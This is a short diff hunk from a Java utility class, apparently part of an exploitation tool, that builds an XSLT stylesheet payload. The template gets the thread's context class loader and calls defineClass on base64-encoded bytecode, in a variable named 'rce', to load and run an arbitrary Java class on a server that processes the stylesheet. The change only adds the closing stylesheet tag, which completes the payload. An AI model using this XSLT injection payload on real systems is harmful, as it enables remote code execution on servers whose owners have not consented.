@@ -18,7 +18,7 @@ public class FileHandleUtil {
             "     <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
             "     <xsl:variable name=\"rce\" select=\"ru:defineClass('%s',$bs,$cl)\"/>\n" +
             "     <xsl:value-of select=\"$rce\"/>\n" +
-            "</xsl:template>",base64ClassByteCode,classByteName);
+            "</xsl:template></xsl:stylesheet>",base64ClassByteCode,classByteName);
         return fileModifyResult;
     }
 
